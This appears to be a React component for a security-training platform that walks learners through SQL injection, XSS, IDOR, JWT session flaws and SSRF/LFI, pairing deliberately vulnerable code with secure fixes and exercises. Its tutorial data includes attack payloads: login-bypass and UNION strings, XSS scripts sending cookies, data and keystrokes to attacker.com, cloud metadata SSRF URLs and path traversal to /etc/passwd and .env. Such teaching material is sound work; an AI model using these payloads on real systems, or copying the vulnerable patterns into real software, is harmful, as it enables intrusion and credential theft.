import React, { useState, useEffect } from 'react';
import { ChevronLeftIcon, ChevronRightIcon, PlayIcon, CheckIcon, ExclamationTriangleIcon } from '@heroicons/react/24/outline';
import { CodeBlock } from '../security-lab/CodeBlock';

interface TutorialStep {
  id: string;
  title: string;
  content: string;
  type: 'explanation' | 'demonstration' | 'hands-on' | 'quiz';
  code?: string;
  language?: string;
  interactive?: boolean;
  expectedOutput?: string;
  hints?: string[];
  validation?: (input: string) => boolean;
}

interface LearningModule {
  id: string;
  title: string;
  description: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  estimatedTime: number;
  prerequisites: string[];
  completed: boolean;
  progress: number;
  vulnerabilityType: string;
}

interface GuidedTutorialProps {
  module: LearningModule;
  onComplete: () => void;
  onBack: () => void;
}

export const GuidedTutorial: React.FC<GuidedTutorialProps> = ({ module, onComplete, onBack }) => {
  const [currentStep, setCurrentStep] = useState(0);
  const [userInput, setUserInput] = useState('');
  const [showHints, setShowHints] = useState(false);
  const [stepCompleted, setStepCompleted] = useState<boolean[]>([]);
  const [startTime] = useState(Date.now());

  // Tutorial steps based on module type
  const getTutorialSteps = (moduleId: string): TutorialStep[] => {
    switch (moduleId) {
      case 'sql-injection-basics':
        return [
          {
            id: 'intro',
            title: 'What is SQL Injection?',
            content: `SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered for string literal escape characters embedded in SQL statements.

**Key Concepts:**
- Malicious SQL code is inserted into application queries
- Attackers can bypass authentication, access unauthorized data, or modify database contents
- One of the most common and dangerous web application vulnerabilities`,
            type: 'explanation'
          },
          {
            id: 'basic-example',
            title: 'Basic SQL Injection Example',
            content: `Let's look at a vulnerable login query:`,
            type: 'demonstration',
            code: `// Vulnerable code
const query = "SELECT * FROM users WHERE email = '" + userEmail + "' AND password = '" + userPassword + "'";

// Normal input:
// email: "user@example.com"
// password: "mypassword"
// Query: SELECT * FROM users WHERE email = 'user@example.com' AND password = 'mypassword'

// Malicious input:
// email: "admin@example.com' --"
// password: "anything"
// Query: SELECT * FROM users WHERE email = 'admin@example.com' --' AND password = 'anything'`,
            language: 'javascript'
          },
          {
            id: 'hands-on-basic',
            title: 'Try Basic SQL Injection',
            content: `Now it's your turn! Try to craft a SQL injection payload that would bypass the login check.

**Scenario:** You have a login form that uses this vulnerable query:
\`SELECT * FROM users WHERE email = '[INPUT]' AND password = '[PASSWORD]'\`

**Goal:** Create an email input that would make the query return a user record without knowing the password.

**Hint:** Use SQL comments (--) to ignore the password check.`,
            type: 'hands-on',
            interactive: true,
            expectedOutput: "admin@example.com' --",
            hints: [
              "Think about how to close the email string and add a comment",
              "The -- sequence comments out the rest of the SQL query",
              "Try: admin@example.com' --"
            ],
            validation: (input: string) => {
              return input.includes("'") && input.includes("--");
            }
          },
          {
            id: 'union-intro',
            title: 'UNION-based SQL Injection',
            content: `UNION-based SQL injection allows attackers to extract data from other database tables by combining results from multiple SELECT statements.

**Requirements for UNION attacks:**
1. The number of columns must match between queries
2. Data types must be compatible
3. The application must display query results`,
            type: 'explanation'
          },
          {
            id: 'union-example',
            title: 'UNION Attack Example',
            content: `Here's how a UNION attack works:`,
            type: 'demonstration',
            code: `// Original query
SELECT title, description FROM tasks WHERE user_id = 1 AND title LIKE '%search_term%'

// Malicious input: test' UNION SELECT email, password_hash FROM users--
// Resulting query:
SELECT title, description FROM tasks WHERE user_id = 1 AND title LIKE '%test' 
UNION SELECT email, password_hash FROM users--%'

// This returns both task data AND user credentials!`,
            language: 'sql'
          },
          {
            id: 'hands-on-union',
            title: 'Practice UNION Injection',
            content: `**Scenario:** A search function uses this query:
\`SELECT id, title FROM articles WHERE title LIKE '%[SEARCH]%'\`

**Goal:** Use UNION injection to extract user emails from the users table.

**Challenge:** The query returns 2 columns (id, title), so your UNION must also return 2 columns.`,
            type: 'hands-on',
            interactive: true,
            expectedOutput: "test' UNION SELECT id, email FROM users--",
            hints: [
              "You need to match the number of columns (2)",
              "Use UNION SELECT to add another query",
              "Don't forget to comment out the rest with --"
            ],
            validation: (input: string) => {
              return input.toLowerCase().includes("union") && 
                     input.toLowerCase().includes("select") && 
                     input.includes("--");
            }
          },
          {
            id: 'prevention',
            title: 'Prevention Techniques',
            content: `**How to prevent SQL injection:**

1. **Parameterized Queries (Prepared Statements)**
2. **Input Validation and Sanitization**
3. **Least Privilege Database Access**
4. **Web Application Firewalls (WAF)**
5. **Regular Security Testing**`,
            type: 'explanation'
          },
          {
            id: 'secure-code',
            title: 'Secure Code Example',
            content: `Here's how to write secure code using parameterized queries:`,
            type: 'demonstration',
            code: `// Secure code using Prisma ORM
const user = await prisma.user.findFirst({
  where: {
    email: userEmail,
    passwordHash: hashedPassword
  }
});

// Secure code using raw SQL with parameters
const query = 'SELECT * FROM users WHERE email = $1 AND password_hash = $2';
const result = await db.query(query, [userEmail, hashedPassword]);

// The database driver automatically escapes the parameters`,
            language: 'javascript'
          },
          {
            id: 'quiz',
            title: 'Knowledge Check',
            content: `**Question:** Which of the following is the MOST effective way to prevent SQL injection?

A) Input validation only
B) Using parameterized queries/prepared statements
C) Encoding user input
D) Using a Web Application Firewall`,
            type: 'quiz',
            validation: (input: string) => {
              return input.toLowerCase() === 'b';
            }
          }
        ];

      case 'xss-fundamentals':
        return [
          {
            id: 'intro',
            title: 'Understanding Cross-Site Scripting (XSS)',
            content: `Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

**Types of XSS:**
- **Reflected XSS:** Script is reflected off the web server
- **Stored XSS:** Script is permanently stored on the target server
- **DOM-based XSS:** Vulnerability exists in client-side code

**Impact:**
- Session hijacking and cookie theft
- Defacement of web pages
- Redirection to malicious sites
- Keylogging and credential theft`,
            type: 'explanation'
          },
          {
            id: 'reflected-example',
            title: 'Reflected XSS Example',
            content: `Here's a simple reflected XSS vulnerability:`,
            type: 'demonstration',
            code: `// Vulnerable PHP code
<?php
echo "Hello " . $_GET['name'];
?>

// URL: http://example.com/page.php?name=<script>alert('XSS')</script>
// Output: Hello <script>alert('XSS')</script>

// The script executes in the victim's browser!`,
            language: 'php'
          },
          {
            id: 'stored-example',
            title: 'Stored XSS Example',
            content: `Stored XSS is more dangerous as it affects all users who view the content:`,
            type: 'demonstration',
            code: `// Vulnerable comment system
app.post('/comments', (req, res) => {
  const comment = req.body.comment;
  
  // Directly storing user input without sanitization
  db.query('INSERT INTO comments (content) VALUES (?)', [comment]);
  
  res.redirect('/comments');
});

// Displaying comments without encoding
app.get('/comments', (req, res) => {
  db.query('SELECT * FROM comments', (err, results) => {
    let html = '<div>';
    results.forEach(comment => {
      html += '<p>' + comment.content + '</p>'; // XSS vulnerability!
    });
    html += '</div>';
    res.send(html);
  });
});`,
            language: 'javascript'
          },
          {
            id: 'hands-on-basic',
            title: 'Create an XSS Payload',
            content: `**Scenario:** A website displays user comments without proper sanitization.

**Goal:** Create a basic XSS payload that shows an alert box with the message "XSS Found".

**Hint:** Use the HTML script tag with JavaScript alert function.`,
            type: 'hands-on',
            interactive: true,
            expectedOutput: "<script>alert('XSS Found')</script>",
            hints: [
              "Use <script> tags to execute JavaScript",
              "The alert() function shows a popup message",
              "Try: <script>alert('XSS Found')</script>"
            ],
            validation: (input: string) => {
              return input.includes('<script>') && 
                     input.includes('alert') && 
                     input.includes('XSS Found');
            }
          },
          {
            id: 'advanced-payloads',
            title: 'Advanced XSS Payloads',
            content: `XSS can be used for more than just alert boxes:`,
            type: 'demonstration',
            code: `// Cookie stealing
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

// Session hijacking
<script>
fetch('/api/user/data', {
  method: 'GET',
  credentials: 'include'
}).then(response => response.json())
.then(data => {
  fetch('http://attacker.com/exfiltrate', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>

// Keylogger
<script>
document.addEventListener('keypress', function(e) {
  fetch('http://attacker.com/keylog', {
    method: 'POST',
    body: 'key=' + e.key
  });
});
</script>`,
            language: 'javascript'
          },
          {
            id: 'prevention',
            title: 'XSS Prevention',
            content: `**Prevention techniques:**

1. **Output Encoding/Escaping**
2. **Input Validation**
3. **Content Security Policy (CSP)**
4. **Use Safe APIs**
5. **Sanitize HTML Content**`,
            type: 'explanation'
          },
          {
            id: 'secure-code',
            title: 'Secure Implementation',
            content: `Here's how to properly handle user input:`,
            type: 'demonstration',
            code: `// Secure React component
import DOMPurify from 'dompurify';

const CommentDisplay = ({ comment }) => {
  // Option 1: Display as text (safest)
  return <div>{comment.content}</div>;
  
  // Option 2: Sanitize HTML if needed
  const sanitizedContent = DOMPurify.sanitize(comment.content);
  return <div dangerouslySetInnerHTML={{__html: sanitizedContent}} />;
};

// Secure server-side handling
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

app.post('/comments', (req, res) => {
  const comment = escapeHtml(req.body.comment);
  db.query('INSERT INTO comments (content) VALUES (?)', [comment]);
  res.redirect('/comments');
});`,
            language: 'javascript'
          }
        ];

      case 'idor-discovery':
        return [
          {
            id: 'intro',
            title: 'What is IDOR?',
            content: `Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. This vulnerability allows attackers to bypass authorization and access resources belonging to other users.

**Key Characteristics:**
- Direct object references in URLs or parameters
- Missing authorization checks
- Predictable object identifiers
- Horizontal and vertical privilege escalation`,
            type: 'explanation'
          },
          {
            id: 'example',
            title: 'IDOR Example',
            content: `Here's a typical IDOR vulnerability:`,
            type: 'demonstration',
            code: `// Vulnerable endpoint
app.get('/api/users/:id/profile', authenticateUser, (req, res) => {
  const userId = req.params.id;
  
  // VULNERABILITY: No ownership check!
  const profile = db.getUserProfile(userId);
  res.json(profile);
});

// URL: /api/users/123/profile
// Attacker changes to: /api/users/124/profile
// Result: Access to another user's profile!`,
            language: 'javascript'
          },
          {
            id: 'hands-on',
            title: 'Identify IDOR Vulnerability',
            content: `**Scenario:** You're testing an API endpoint: \`GET /api/documents/456\`

**Your user ID:** 123
**Document ID:** 456

**Question:** What would you try to test for IDOR?`,
            type: 'hands-on',
            interactive: true,
            hints: [
              "Try changing the document ID to see if you can access other documents",
              "Look for patterns in the ID numbering",
              "Test both incrementing and decrementing the ID"
            ],
            validation: (input: string) => {
              return input.toLowerCase().includes('change') && 
                     (input.includes('id') || input.includes('456'));
            }
          },
          {
            id: 'prevention',
            title: 'IDOR Prevention',
            content: `**How to prevent IDOR:**

1. **Implement proper authorization checks**
2. **Use indirect object references**
3. **Validate user permissions for each request**
4. **Use UUIDs instead of sequential IDs**
5. **Implement access control matrices**`,
            type: 'explanation'
          },
          {
            id: 'secure-code',
            title: 'Secure Implementation',
            content: `Here's how to fix IDOR vulnerabilities:`,
            type: 'demonstration',
            code: `// Secure implementation
app.get('/api/users/:id/profile', authenticateUser, (req, res) => {
  const requestedUserId = req.params.id;
  const currentUserId = req.user.id;
  
  // Authorization check
  if (requestedUserId !== currentUserId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  const profile = db.getUserProfile(requestedUserId);
  res.json(profile);
});

// Alternative: Use session-based access
app.get('/api/profile', authenticateUser, (req, res) => {
  // Always return current user's profile
  const profile = db.getUserProfile(req.user.id);
  res.json(profile);
});`,
            language: 'javascript'
          }
        ];

      case 'session-management':
        return [
          {
            id: 'intro',
            title: 'Session Management Security',
            content: `Session management is critical for maintaining user authentication state. Poor session management can lead to session hijacking, fixation, and other attacks.

**Common Issues:**
- Weak session tokens
- Insecure token storage
- Missing token expiration
- Inadequate session invalidation`,
            type: 'explanation'
          },
          {
            id: 'jwt-vulnerabilities',
            title: 'JWT Security Issues',
            content: `JSON Web Tokens (JWT) are commonly used but often implemented insecurely:`,
            type: 'demonstration',
            code: `// VULNERABLE JWT implementation
const jwt = require('jsonwebtoken');

// Weak secret
const token = jwt.sign(
  { userId: user.id }, 
  'secret123',  // Easily guessable!
  { expiresIn: '30d' }  // Too long!
);

// Insecure storage (client-side)
localStorage.setItem('token', token);  // Accessible to XSS!

// No refresh mechanism
// Tokens live for 30 days without rotation`,
            language: 'javascript'
          },
          {
            id: 'hands-on',
            title: 'Identify Session Vulnerabilities',
            content: `**Scenario:** You find a JWT token stored in localStorage with this payload:

\`\`\`json
{
  "userId": 123,
  "role": "user",
  "exp": 1735689600
}
\`\`\`

**Question:** What security issues can you identify?`,
            type: 'hands-on',
            interactive: true,
            hints: [
              "Consider where the token is stored",
              "Look at the expiration time",
              "Think about token rotation",
              "Consider the signing algorithm"
            ],
            validation: (input: string) => {
              return input.toLowerCase().includes('localstorage') || 
                     input.toLowerCase().includes('xss') ||
                     input.toLowerCase().includes('expir');
            }
          },
          {
            id: 'secure-sessions',
            title: 'Secure Session Management',
            content: `Best practices for secure sessions:`,
            type: 'demonstration',
            code: `// Secure JWT implementation
const crypto = require('crypto');

// Strong, random secret
const JWT_SECRET = crypto.randomBytes(64).toString('hex');

// Short-lived access token
const accessToken = jwt.sign(
  { userId: user.id },
  JWT_SECRET,
  { expiresIn: '15m' }  // Short expiration
);

// Refresh token for renewal
const refreshToken = crypto.randomBytes(64).toString('hex');

// Secure cookie storage
res.cookie('accessToken', accessToken, {
  httpOnly: true,    // Not accessible to JavaScript
  secure: true,      // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 15 * 60 * 1000  // 15 minutes
});

// Token refresh endpoint
app.post('/auth/refresh', (req, res) => {
  const { refreshToken } = req.body;
  
  if (!isValidRefreshToken(refreshToken)) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
  
  // Generate new tokens
  const newAccessToken = generateAccessToken(user);
  const newRefreshToken = generateRefreshToken();
  
  // Invalidate old refresh token
  invalidateRefreshToken(refreshToken);
  
  res.json({ accessToken: newAccessToken, refreshToken: newRefreshToken });
});`,
            language: 'javascript'
          }
        ];

      case 'ssrf-lfi-basics':
        return [
          {
            id: 'intro',
            title: 'SSRF and LFI Overview',
            content: `**Server-Side Request Forgery (SSRF)** allows attackers to make requests from the server to internal or external resources.

**Local File Inclusion (LFI)** enables attackers to include local files on the server, potentially exposing sensitive information.

**Common Attack Vectors:**
- Cloud metadata services (AWS, GCP, Azure)
- Internal network scanning
- File system access
- Service enumeration`,
            type: 'explanation'
          },
          {
            id: 'ssrf-example',
            title: 'SSRF Vulnerability Example',
            content: `Here's a typical SSRF vulnerability:`,
            type: 'demonstration',
            code: `// Vulnerable image upload endpoint
app.post('/api/upload-image', (req, res) => {
  const { imageUrl } = req.body;
  
  // VULNERABILITY: No URL validation!
  fetch(imageUrl)
    .then(response => response.buffer())
    .then(buffer => {
      fs.writeFileSync('./uploads/image.jpg', buffer);
      res.json({ success: true });
    })
    .catch(err => {
      // VULNERABILITY: Error reveals internal information
      res.status(500).json({ 
        error: err.message,
        requestedUrl: imageUrl 
      });
    });
});

// Malicious requests:
// http://169.254.169.254/latest/meta-data/  (AWS metadata)
// http://localhost:6379/  (Redis)
// file:///etc/passwd  (Local file)`,
            language: 'javascript'
          },
          {
            id: 'hands-on',
            title: 'Craft SSRF Payload',
            content: `**Scenario:** An application allows you to "import" data by providing a URL. The endpoint is: \`POST /api/import\`

**Goal:** Create a payload to access AWS metadata service.

**Hint:** AWS metadata is available at a specific IP address.`,
            type: 'hands-on',
            interactive: true,
            hints: [
              "AWS metadata service is at 169.254.169.254",
              "Try the path /latest/meta-data/",
              "Full URL: http://169.254.169.254/latest/meta-data/"
            ],
            validation: (input: string) => {
              return input.includes('169.254.169.254') && 
                     input.includes('meta-data');
            }
          },
          {
            id: 'lfi-example',
            title: 'Local File Inclusion',
            content: `LFI vulnerabilities often occur in file serving endpoints:`,
            type: 'demonstration',
            code: `// Vulnerable file serving
app.get('/api/files/:filename', (req, res) => {
  const filename = req.params.filename;
  
  // VULNERABILITY: Path traversal!
  const filePath = path.join('./uploads/', filename);
  
  try {
    const content = fs.readFileSync(filePath);
    res.send(content);
  } catch (err) {
    res.status(404).json({ error: 'File not found', path: filePath });
  }
});

// Malicious requests:
// /api/files/../../../etc/passwd
// /api/files/../../../../proc/version
// /api/files/../../../app/.env`,
            language: 'javascript'
          },
          {
            id: 'prevention',
            title: 'SSRF and LFI Prevention',
            content: `**Prevention techniques:**

**For SSRF:**
1. **URL validation and whitelisting**
2. **Block private IP ranges**
3. **Disable dangerous protocols (file://, gopher://)**
4. **Use DNS resolution filtering**
5. **Network segmentation**

**For LFI:**
1. **Input validation and sanitization**
2. **Use absolute paths**
3. **Implement file access controls**
4. **Avoid user-controlled file paths**
5. **Use chroot jails**`,
            type: 'explanation'
          },
          {
            id: 'secure-code',
            title: 'Secure Implementation',
            content: `Here's how to implement secure file handling:`,
            type: 'demonstration',
            code: `// Secure SSRF prevention
const validDomains = ['api.example.com', 'cdn.example.com'];
const privateIPRanges = [
  /^10\./,
  /^172\.(1[6-9]|2[0-9]|3[01])\./,
  /^192\.168\./,
  /^127\./,
  /^169\.254\./  // AWS metadata
];

app.post('/api/import', async (req, res) => {
  const { url } = req.body;
  
  try {
    const parsedUrl = new URL(url);
    
    // Protocol validation
    if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
      return res.status(400).json({ error: 'Invalid protocol' });
    }
    
    // Domain whitelist
    if (!validDomains.includes(parsedUrl.hostname)) {
      return res.status(400).json({ error: 'Domain not allowed' });
    }
    
    // IP range blocking
    const ip = await dns.lookup(parsedUrl.hostname);
    if (privateIPRanges.some(range => range.test(ip.address))) {
      return res.status(400).json({ error: 'Private IP not allowed' });
    }
    
    // Make request with timeout
    const response = await fetch(url, { 
      timeout: 5000,
      redirect: 'manual'  // Prevent redirect attacks
    });
    
    res.json({ data: await response.text() });
    
  } catch (err) {
    res.status(400).json({ error: 'Invalid URL' });
  }
});

// Secure file serving
const allowedFiles = new Set(['image1.jpg', 'document1.pdf']);

app.get('/api/files/:filename', (req, res) => {
  const filename = req.params.filename;
  
  // Whitelist validation
  if (!allowedFiles.has(filename)) {
    return res.status(404).json({ error: 'File not found' });
  }
  
  // Sanitize filename
  const safeName = path.basename(filename);
  const filePath = path.resolve('./uploads/', safeName);
  
  // Ensure file is within uploads directory
  if (!filePath.startsWith(path.resolve('./uploads/'))) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  res.sendFile(filePath);
});`,
            language: 'javascript'
          }
        ];

      default:
        return [
          {
            id: 'placeholder',
            title: 'Tutorial Coming Soon',
            content: 'This tutorial is currently being developed. Please check back later!',
            type: 'explanation'
          }
        ];
    }
  };

  const steps = getTutorialSteps(module.id);

  useEffect(() => {
    setStepCompleted(new Array(steps.length).fill(false));
  }, [steps.length]);

  const handleNext = () => {
    if (currentStep < steps.length - 1) {
      // Mark current step as completed
      const newCompleted = [...stepCompleted];
      newCompleted[currentStep] = true;
      setStepCompleted(newCompleted);
      
      setCurrentStep(currentStep + 1);
      setUserInput('');
      setShowHints(false);
    } else {
      // Tutorial completed
      const timeSpent = Math.round((Date.now() - startTime) / 1000 / 60); // minutes
      console.log(`Tutorial completed in ${timeSpent} minutes`);
      onComplete();
    }
  };

  const handlePrevious = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1);
      setUserInput('');
      setShowHints(false);
    }
  };

  const handleSubmit = () => {
    const step = steps[currentStep];
    if (step.validation && step.validation(userInput)) {
      handleNext();
    } else {
      setShowHints(true);
    }
  };

  const currentStepData = steps[currentStep];
  const progress = ((currentStep + 1) / steps.length) * 100;

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="py-4 flex items-center justify-between">
            <button
              onClick={onBack}
              className="flex items-center text-gray-600 hover:text-gray-900"
            >
              <ChevronLeftIcon className="h-5 w-5 mr-1" />
              Back to Learning Center
            </button>
            <div className="text-center">
              <h1 className="text-xl font-semibold text-gray-900">{module.title}</h1>
              <p className="text-sm text-gray-600">Step {currentStep + 1} of {steps.length}</p>
            </div>
            <div className="w-24"></div>
          </div>
          
          {/* Progress Bar */}
          <div className="pb-4">
            <div className="bg-gray-200 rounded-full h-2">
              <div
                className="bg-blue-600 h-2 rounded-full transition-all duration-300"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        </div>
      </div>

      {/* Content */}
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="bg-white rounded-lg shadow-lg p-8">
          {/* Step Header */}
          <div className="mb-6">
            <div className="flex items-center space-x-3 mb-4">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
                stepCompleted[currentStep] ? 'bg-green-100 text-green-800' : 'bg-blue-100 text-blue-800'
              }`}>
                {stepCompleted[currentStep] ? <CheckIcon className="h-5 w-5" /> : currentStep + 1}
              </div>
              <h2 className="text-2xl font-bold text-gray-900">{currentStepData.title}</h2>
            </div>
            
            {currentStepData.type === 'hands-on' && (
              <div className="bg-yellow-50 border border-yellow-200 rounded-md p-4 mb-4">
                <div className="flex">
                  <ExclamationTriangleIcon className="h-5 w-5 text-yellow-400 mr-2" />
                  <div className="text-sm text-yellow-800">
                    <strong>Hands-on Exercise:</strong> Try to solve this challenge yourself before looking at hints.
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Step Content */}
          <div className="prose max-w-none mb-8">
            <div className="whitespace-pre-wrap text-gray-700 leading-relaxed">
              {currentStepData.content}
            </div>
            
            {currentStepData.code && (
              <div className="mt-6">
                <CodeBlock
                  code={currentStepData.code}
                  language={currentStepData.language || 'javascript'}
                  showLineNumbers={true}
                />
              </div>
            )}
          </div>

          {/* Interactive Elements */}
          {currentStepData.interactive && (
            <div className="mb-8">
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Your Answer:
              </label>
              <textarea
                value={userInput}
                onChange={(e) => setUserInput(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                rows={3}
                placeholder="Enter your solution here..."
              />
              
              {showHints && currentStepData.hints && (
                <div className="mt-4 bg-blue-50 border border-blue-200 rounded-md p-4">
                  <h4 className="text-sm font-medium text-blue-800 mb-2">Hints:</h4>
                  <ul className="text-sm text-blue-700 space-y-1">
                    {currentStepData.hints.map((hint, index) => (
                      <li key={index}>• {hint}</li>
                    ))}
                  </ul>
                </div>
              )}
              
              <div className="mt-4 flex space-x-3">
                <button
                  onClick={handleSubmit}
                  className="bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 transition-colors"
                >
                  Submit Answer
                </button>
                {!showHints && (
                  <button
                    onClick={() => setShowHints(true)}
                    className="bg-gray-200 text-gray-700 px-4 py-2 rounded-md hover:bg-gray-300 transition-colors"
                  >
                    Show Hints
                  </button>
                )}
              </div>
            </div>
          )}

          {/* Navigation */}
          <div className="flex justify-between items-center pt-6 border-t border-gray-200">
            <button
              onClick={handlePrevious}
              disabled={currentStep === 0}
              className={`flex items-center px-4 py-2 rounded-md ${
                currentStep === 0
                  ? 'text-gray-400 cursor-not-allowed'
                  : 'text-gray-700 hover:bg-gray-100'
              }`}
            >
              <ChevronLeftIcon className="h-5 w-5 mr-1" />
              Previous
            </button>

            <div className="text-sm text-gray-500">
              {currentStep + 1} / {steps.length}
            </div>

            <button
              onClick={handleNext}
              className="flex items-center bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 transition-colors"
            >
              {currentStep === steps.length - 1 ? 'Complete Tutorial' : 'Next'}
              <ChevronRightIcon className="h-5 w-5 ml-1" />
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};